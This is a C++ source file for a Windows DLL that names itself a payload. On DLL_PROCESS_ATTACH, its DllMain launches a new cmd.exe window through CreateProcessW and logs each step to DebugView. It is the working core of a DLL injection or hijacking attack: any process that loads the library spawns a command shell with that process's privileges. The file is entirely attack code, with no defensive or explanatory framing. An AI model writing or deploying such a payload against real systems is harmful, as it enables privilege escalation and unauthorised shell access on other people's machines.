// opencmd_payload.cpp
#include <windows.h>
#include <stdio.h> // For wvsprintfW or _vsnwprintf_s

// Helper to output to DebugView
VOID OutputDebugStringFormat( LPCWSTR format, ... ) {
   WCHAR buf[1024];
   va_list args;
   va_start( args, format );
   #ifdef _MSC_VER
     _vsnwprintf_s(buf, sizeof(buf)/sizeof(WCHAR), _TRUNCATE, format, args);
   #else
     wvsprintfW( buf, format, args );
   #endif
   va_end( args );
   OutputDebugStringW( buf );
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved )
{
    (void)hModule;    // Mark as unused
    (void)lpReserved; // Mark as unused

    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        OutputDebugStringW(L"[opencmd_payload.dll] DLL_PROCESS_ATTACH entered.\n");
        
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        
        // Command to launch cmd.exe
        // Using "cmd.exe /c start cmd.exe" can help launch a new, independent window
        // Simpler: WCHAR cmd[] = L"cmd.exe"; 
        WCHAR cmd[] = L"cmd.exe /c start cmd.exe"; // This tries to launch a new window properly

        if (CreateProcessW(
                NULL,   // ApplicationName
                cmd,    // Command line
                NULL,   // Process handle not inheritable
                NULL,   // Thread handle not inheritable
                FALSE,  // Set handle inheritance to FALSE
                0,      // No creation flags (could use CREATE_NEW_CONSOLE if needed)
                NULL,   // Use parent's environment block
                NULL,   // Use parent's starting directory 
                &si,    // Pointer to STARTUPINFO structure
                &pi)    // Pointer to PROCESS_INFORMATION structure
           )
        {
            OutputDebugStringFormat(L"[opencmd_payload.dll] CreateProcessW for cmd.exe SUCCEEDED. Process ID: %lu\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            DWORD dwError = GetLastError();
            OutputDebugStringFormat(L"[opencmd_payload.dll] CreateProcessW for cmd.exe FAILED. Error: %d (0x%X)\n", dwError, dwError);
        }
        
        OutputDebugStringW(L"[opencmd_payload.dll] Reached end of DLL_PROCESS_ATTACH, returning TRUE.\n");
        return TRUE; // CRITICAL
    }
    else if (ul_reason_for_call == DLL_PROCESS_DETACH)
    {
        OutputDebugStringW(L"[opencmd_payload.dll] DLL_PROCESS_DETACH.\n");
    }
    return TRUE; 
}